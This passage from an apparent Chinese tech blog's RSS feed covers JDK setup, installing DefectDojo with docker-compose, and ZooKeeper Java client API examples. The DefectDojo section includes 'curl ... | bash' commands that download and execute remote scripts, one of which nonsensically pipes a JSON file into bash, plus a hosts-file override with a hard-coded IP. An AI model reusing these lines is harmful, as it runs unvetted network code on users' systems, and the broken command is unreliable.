language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/profile<span class="token comment" spellcheck="true">#修改JAVA_HOME为jdk目录</span><span class="token keyword">echo</span> <span class="token variable">$JAVA_HOME</span><span class="token comment" spellcheck="true">#查看环境变量</span>/usr/lib/jvm/java-1.8.0-openjdk-1.8.0.282.b08-1.el7_9.x86_64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603868088313.png" alt="1603868088313"></p><p> 让profile文件立即生效 ，1.8java安装成功</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>root@ids0001 ~<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#  source /etc/profile</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/02/18/linux-jdk8/1603867783946.png" alt="1603867783946"></p>]]></content:encoded>
      
      
      
      
      <comments>https://m01ly.github.io/2021/02/18/linux-jdk8/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>DefectDojo安装与使用</title>
      <link>https://m01ly.github.io/2021/01/21/esc-DefectDojo/</link>
      <guid>https://m01ly.github.io/2021/01/21/esc-DefectDojo/</guid>
      <pubDate>Thu, 21 Jan 2021 02:22:45 GMT</pubDate>
      
      <description>&lt;p&gt;最近老板要求建设资产管理与服务软件，团队人员少，只能找找开源的啦，DefectDojo基于Django框架可以搭建看看&lt;/p&gt;</description>
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>最近老板要求建设资产管理与服务软件，团队人员少，只能找找开源的啦，DefectDojo基于Django框架可以搭建看看</p><a id="more"></a><h1 id="1-前期准备"><a href="#1-前期准备" class="headerlink" title="1 前期准备"></a>1 前期准备</h1><h2 id="1-1-官方文档"><a href="#1-1-官方文档" class="headerlink" title="1.1 官方文档"></a>1.1 官方文档</h2><p>github地址:<a href="https://github.com/DefectDojo/django-DefectDojo">https://github.com/DefectDojo/django-DefectDojo</a></p><p>官方文档:<a href="https://defectdojo.readthedocs.io/en/latest/about.html">https://defectdojo.readthedocs.io/en/latest/about.html</a></p><h2 id="1-2-环境版本"><a href="#1-2-环境版本" class="headerlink" title="1.2 环境版本"></a>1.2 环境版本</h2><h3 id="1-2-1-docker-compose"><a href="#1-2-1-docker-compose" class="headerlink" title="1.2.1 docker-compose"></a>1.2.1 docker-compose</h3><p>使用docker-compose进行安装至少需要docker 18.09.4和docker-compose 1.22.0,如果没有安装,则按照下面命令安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">cd</span> /usr/local/bin/<span class="token function">wget</span> https://github.com/docker/compose/releases/download/1.22.0/docker-compose-Linux-x86_64<span class="token function">rename</span> docker-compose-Linux-x86_64 docker-compose docker-compose-Linux-x86_64<span class="token function">chmod</span> +x /usr/local/bin/docker-compose./docker-compose version<span class="token function">sudo</span> <span class="token function">ln</span> -s /usr/local/bin/docker-compose /usr/bin/docker-compose<span class="token comment" spellcheck="true">#加个软连接</span>docker-compose version<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1611195834714.png" alt="1611195834714"></p><h3 id="1-2-2-python版本3之上"><a href="#1-2-2-python版本3之上" class="headerlink" title="1.2.2 python版本3之上"></a>1.2.2 python版本3之上</h3><p><img src="/2021/01/21/esc-DefectDojo/1611652410659.png" alt="1611652410659"></p><h1 id="2-安装"><a href="#2-安装" class="headerlink" title="2 安装"></a>2 安装</h1><h2 id="2-1-下载安装"><a href="#2-1-下载安装" class="headerlink" title="2.1 下载安装"></a>2.1 下载安装</h2><p>执行下面的命令,进行安装</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/DefectDojo/django-DefectDojo<span class="token function">cd</span> django-DefectDojo<span class="token comment" spellcheck="true"># building</span>docker-compose build<span class="token comment" spellcheck="true"># running</span>docker-compose up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>执行docker-compose build时候,会报错如下:(如果build有错,也可直接up就行)</strong></p><p>curl: (7) Failed to connect to raw.githubusercontent.com port 443: Connection refused</p><p><img src="/2021/01/21/esc-DefectDojo/1611211553110.png" alt="1611211553110"></p><p><a href="https://github.com/hawtim/blog/issues/10">解决办法</a>：</p><p><img src="/2021/01/21/esc-DefectDojo/1611211540151.png" alt="1611211540151"></p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">vi</span> /etc/hosts<span class="token comment" spellcheck="true">#编辑hosts,添加如下映射</span>199.232.96.133 raw.githubusercontent.com199.232.96.133 user-images.githubusercontent.com199.232.96.133 avatars2.githubusercontent.com199.232.96.133 avatars1.githubusercontent.com/etc/init.d/networking restart<span class="token comment" spellcheck="true">#重启网络</span><span class="token function">service</span> network restart<span class="token comment" spellcheck="true">#或者这种方法重启网络</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以访问下面几个网址测试是否修改成功,</p><pre class="line-numbers language-bash"><code class="language-bash">curl -L https://raw.githubusercontent.com/pyupio/safety-db/master/data/insecure_full.json <span class="token operator">|</span> <span class="token function">bash</span> -s stablecurl -L https://get.rvm.io <span class="token operator">|</span> <span class="token function">bash</span> -s stable<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2021/01/21/esc-DefectDojo/1612339821470.png" alt="1612339821470"></p><p><img src="/2021/01/21/esc-DefectDojo/1611643936373.png" alt="1611643936373"></p><h2 id="2-2-登录"><a href="#2-2-登录" class="headerlink" title="2.2 登录"></a>2.2 登录</h2><p>安装后的初始密码会出线再log里面,直接用下面命令进行查找.</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># use docker-compose logs -f initializer to track progress</span>docker-compose logs initializer <span class="token operator">|</span> <span class="token function">grep</span> <span class="token string">"Admin password:"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果显示如下用户密码已经存在,但是自己忘记密码了密码,可以重新创建新用户及密码</p><p><img src="/2021/01/21/esc-DefectDojo/1612340052892.png" alt="1612340052892"></p><pre class="line-numbers language-bash"><code class="language-bash">docker-compose <span class="token function">exec</span> uwsgi /bin/bash -c <span class="token string">'python manage.py createsuperuser'</span><span class="token comment" spellcheck="true">#创建新的超级用户和密码</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后访问: <a href="http://localhost:8080/%E6%88%96%E8%80%85http://10.27.22.92:8080/dashboard">http://localhost:8080/或者http://10.27.22.92:8080/dashboard</a></p><p><img src="/2021/01/21/esc-DefectDojo/1612340217583.png" alt="1612340217583"></p><h1 id="3-使用"><a href="#3-使用" class="headerlink" title="3 使用"></a>3 使用</h1><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://owasp.org/www-pdf-archive/Defectdojo-owasp-stammtisch-final.pdf">Defectdojo架构</a></p><p><a href="https://readthedocs.org/projects/defectdojo/downloads/pdf/latest/">相关文档pdf</a></p><p><a href="https://github.com/DefectDojo/django-DefectDojo/issues/2018">Defectdojo问题列表解决</a></p>]]></content:encoded>
      
      
      
      <category domain="https://m01ly.github.io/tags/%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E5%BB%BA%E8%AE%BE/">企业安全建设</category>
      
      
      <comments>https://m01ly.github.io/2021/01/21/esc-DefectDojo/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>Zookeeper学习笔记（三） API使用</title>
      <link>https://m01ly.github.io/2020/12/01/bigdata-zookeeper3-API/</link>
      <guid>https://m01ly.github.io/2020/12/01/bigdata-zookeeper3-API/</guid>
      <pubDate>Tue, 01 Dec 2020 06:26:03 GMT</pubDate>
      
        
        
      <description></description>
        
      
      
      
      <content:encoded><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h3 id="1-IDEA环境搭建"><a href="#1-IDEA环境搭建" class="headerlink" title="1 IDEA环境搭建"></a>1 IDEA环境搭建</h3><p>1）创建一个Maven Module</p><p>2）添加pom文件</p><pre class="line-numbers language-xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependencies</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>junit<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>RELEASE<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.logging.log4j<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>log4j-core<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>2.8.2<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dependency</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.apache.zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>zookeeper<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>3.5.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependencies</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>3）拷贝log4j.properties文件到项目根目录<br>需要在项目的src/main/resources目录下，新建一个文件，命名为“log4j.properties”，在文件中填入。</p><pre class="line-numbers language-properties"><code class="language-properties"><span class="token attr-name">log4j.rootLogger</span><span class="token punctuation">=</span><span class="token attr-value">INFO, stdout</span><span class="token attr-name">log4j.appender.stdout</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.ConsoleAppender</span><span class="token attr-name">log4j.appender.stdout.layout</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.PatternLayout</span><span class="token attr-name">log4j.appender.stdout.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token attr-value">%d %p [%c] - %m%n</span><span class="token attr-name">log4j.appender.logfile</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.FileAppender</span><span class="token attr-name">log4j.appender.logfile.File</span><span class="token punctuation">=</span><span class="token attr-value">target/spring.log</span><span class="token attr-name">log4j.appender.logfile.layout</span><span class="token punctuation">=</span><span class="token attr-value">org.apache.log4j.PatternLayout</span><span class="token attr-name">log4j.appender.logfile.layout.ConversionPattern</span><span class="token punctuation">=</span><span class="token attr-value">%d %p [%c] - %m%n</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-初始化ZooKeeper客户端"><a href="#2-初始化ZooKeeper客户端" class="headerlink" title="2 初始化ZooKeeper客户端"></a>2 初始化ZooKeeper客户端</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Zookeeper</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token keyword">private</span> String connectString<span class="token punctuation">;</span><span class="token keyword">private</span> <span class="token keyword">int</span> sessionTimeout<span class="token punctuation">;</span><span class="token keyword">private</span> ZooKeeper zkClient<span class="token punctuation">;</span><span class="token annotation punctuation">@Before</span>   <span class="token comment" spellcheck="true">//获取客户端对象</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​    connectString <span class="token operator">=</span> <span class="token string">"hadoop102:2181,hadoop103:2181,hadoop104:2181"</span><span class="token punctuation">;</span>​    <span class="token keyword">int</span> sessionTimeout <span class="token operator">=</span> <span class="token number">10000</span><span class="token punctuation">;</span>​       <span class="token comment" spellcheck="true">//参数解读 1集群连接字符串  2连接超时时间 单位:毫秒  3当前客户端默认的监控器</span>​    zkClient <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ZooKeeper</span><span class="token punctuation">(</span>connectString<span class="token punctuation">,</span> sessionTimeout<span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        <span class="token annotation punctuation">@Override</span>​        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span>WatchedEvent event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>​        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>​    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token annotation punctuation">@After</span> <span class="token comment" spellcheck="true">//关闭客户端对象</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    zkClient<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-获取子节点列表-不监听"><a href="#3-获取子节点列表-不监听" class="headerlink" title="3 获取子节点列表,不监听"></a>3 获取子节点列表,不监听</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">ls</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> IOException<span class="token punctuation">,</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//用客户端对象做各种操作</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> children <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>children<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="4-获取子节点列表-并监听"><a href="#4-获取子节点列表-并监听" class="headerlink" title="4 获取子节点列表,并监听"></a>4 获取子节点列表,并监听</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">lsAndWatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    List<span class="token operator">&lt;</span>String<span class="token operator">></span> children <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">getChildren</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span>WatchedEvent event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>children<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//因为设置了监听,所以当前线程不能结束</span>Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>Long<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="5-创建子节点"><a href="#5-创建子节点" class="headerlink" title="5 创建子节点"></a>5 创建子节点</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//参数解读 1节点路径  2节点存储的数据  </span><span class="token comment" spellcheck="true">//3节点的权限(使用Ids选个OPEN即可) 4节点类型 短暂 持久 短暂带序号 持久带序号</span>     String path <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token string">"shanguigu"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ZooDefs<span class="token punctuation">.</span>Ids<span class="token punctuation">.</span>OPEN_ACL_UNSAFE<span class="token punctuation">,</span> CreateMode<span class="token punctuation">.</span>PERSISTENT<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建临时节点</span><span class="token comment" spellcheck="true">//String path = zkClient.create("/atguigu2", "shanguigu".getBytes(), ZooDefs.Ids.OPEN_ACL_UNSAFE, CreateMode.EPHEMERAL);</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>path<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//创建临时节点的话,需要线程阻塞</span><span class="token comment" spellcheck="true">//Thread.sleep(10000);</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="6-判断Znode是否存在"><a href="#6-判断Znode是否存在" class="headerlink" title="6 判断Znode是否存在"></a>6 判断Znode是否存在</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">exist</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> Exception <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>Stat stat <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>stat <span class="token operator">==</span> null <span class="token operator">?</span> <span class="token string">"not exist"</span> <span class="token operator">:</span> <span class="token string">"exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>7 获取子节点存储的数据,不监听</p><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断节点是否存在</span>    Stat stat <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stat <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点不存在..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">,</span> stat<span class="token punctuation">)</span><span class="token punctuation">;</span>System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="8-获取子节点存储的数据-并监听"><a href="#8-获取子节点存储的数据-并监听" class="headerlink" title="8 获取子节点存储的数据,并监听"></a>8 获取子节点存储的数据,并监听</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">getAndWatch</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断节点是否存在</span>    Stat stat <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stat <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点不存在..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> data <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Watcher</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">process</span><span class="token punctuation">(</span>WatchedEvent event<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span class="token punctuation">,</span> stat<span class="token punctuation">)</span><span class="token punctuation">;</span>    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//线程阻塞</span>    Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>Long<span class="token punctuation">.</span>MAX_VALUE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="9-设置节点的值"><a href="#9-设置节点的值" class="headerlink" title="9 设置节点的值"></a>9 设置节点的值</h3><pre class="line-numbers language-java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">set</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> KeeperException<span class="token punctuation">,</span> InterruptedException <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//判断节点是否存在</span>    Stat stat <span class="token operator">=</span> zkClient<span class="token punctuation">.</span><span class="token function">exists</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>stat <span class="token operator">==</span> null<span class="token punctuation">)</span> <span class="token operator">&amp;</span>#<span class="token number">123</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"节点不存在..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token operator">&amp;</span>#<span class="token number">125</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">//参数解读 1节点路径 2节点的值 3版本号</span>    zkClient<span class="token punctuation">.</span><span class="token function">setData</span><span class="token punctuation">(</span><span class="token string">"/atguigu"</span><span class="token punctuation">,</span> <span class="token string">"sgg"</span><span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span 